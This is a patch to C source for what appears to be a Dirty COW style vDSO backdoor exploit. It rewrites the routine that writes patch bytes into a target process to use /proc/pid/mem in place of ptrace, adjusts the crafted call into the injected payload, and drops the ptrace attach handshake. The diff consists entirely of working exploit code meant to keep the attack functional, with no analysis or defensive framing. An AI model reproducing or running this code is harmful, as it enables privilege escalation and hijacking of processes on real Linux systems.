@@ -115,43 +115,29 @@ static void *get_vdso_addr(void)
 	return (void *)getauxval(AT_SYSINFO_EHDR);
 }
 
-static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
+static int proc_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 {
-	const unsigned char *s;
-	unsigned long value;
-	unsigned char *d;
 
-	d = dest;
-	s = src;
+	// Change implementation to use open /proc/pid/mem
 
-	while (n >= sizeof(long)) {
-		memcpy(&value, s, sizeof(value));
-		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
-			warn("ptrace(PTRACE_POKETEXT)");
-			return -1;
-		}
-
-		n -= sizeof(long);
-		d += sizeof(long);
-		s += sizeof(long);
+	char filename[0x100] = {0};
+	sprintf(filename, "/proc/%d/mem", pid);
+	int fd = open(filename, O_RDWR | O_CLOEXEC);
+	if (fd == -1) {
+		warn("open proc mem");
+		return -1;
 	}
-
-	if (n > 0) {
-		d -= sizeof(long) - n;
-
-		errno = 0;
-		value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
-		if (value == -1 && errno != 0) {
-			warn("ptrace(PTRACE_PEEKTEXT)");
-			return -1;
-		}
-
-		memcpy((unsigned char *)&value + sizeof(value) - n, s, n);
-		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
-			warn("ptrace(PTRACE_POKETEXT)");
-			return -1;
-		}
+	if (lseek(fd, (off_t)dest, SEEK_SET) != (off_t)dest) {
+		warn("lseek proc mem");
+		close(fd);
+		return -1;
 	}
+	if (write(fd, src, n) != n) {
+		warn("write proc mem");
+		close(fd);
+		return -1;
+	}
+	close(fd);
 
 	return 0;
 }
@@ -257,8 +243,10 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 	/* craft call to payload */
 	target = VDSO_SIZE - payload_len - clock_gettime_offset;
 	memset(buf, '\x90', sizeof(PATTERN_PROLOGUE)-1);
-	buf[0] = '\xe8';
-	*(uint32_t *)&buf[1] = target - 5;
+
+	// Shift a byte of call
+	buf[1] = '\xe8';
+	*(uint32_t *)&buf[2] = target - 6;
 
 	vdso_patch[1].patch = buf;
 	vdso_patch[1].size = prologue->size;
@@ -274,7 +262,7 @@ static int backdoor_vdso(pid_t pid, unsigned int patch_number)
 	struct vdso_patch *p;
 
 	p = &vdso_patch[patch_number];
-	return ptrace_memcpy(pid, p->addr, p->patch, p->size);
+	return proc_memcpy(pid, p->addr, p->patch, p->size);
 }
 
 static int restore_vdso(pid_t pid, unsigned int patch_number)
@@ -282,7 +270,7 @@ static int restore_vdso(pid_t pid, unsigned int patch_number)
 	struct vdso_patch *p;
 
 	p = &vdso_patch[patch_number];
-	return ptrace_memcpy(pid, p->addr, p->copy, p->size);
+	return proc_memcpy(pid, p->addr, p->copy, p->size);
 }
 
 /*
@@ -331,10 +319,10 @@ static int debuggee(void *arg_)
 	if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) == -1)
 		err(1, "prctl(PR_SET_PDEATHSIG)");
 
-	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
-		err(1, "ptrace(PTRACE_TRACEME)");
-
-	kill(getpid(), SIGSTOP);
+	// Just wait for signal
+	while (1) {
+		sleep(5);
+	}
 
 	return 0;
 }
@@ -356,11 +344,6 @@ static void *ptrace_thread(void *arg_)
 		return NULL;
 	}
 
-	if (waitpid(pid, &status, __WALL) == -1) {
-		warn("waitpid");
-		return NULL;
-	}
-
 	ret = NULL;
 	while (!arg->stop) {
 		if (arg->do_patch)
@@ -374,11 +357,8 @@ static void *ptrace_thread(void *arg_)
 		}
 	}
 
-	if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1)
-		warn("ptrace(PTRACE_CONT)");
-
-	if (waitpid(pid, NULL, __WALL) == -1)
-		warn("waitpid");
+	// Send a sigusr to kill debuggee
+	kill(pid, SIGTERM);
 
 	return ret;
 }
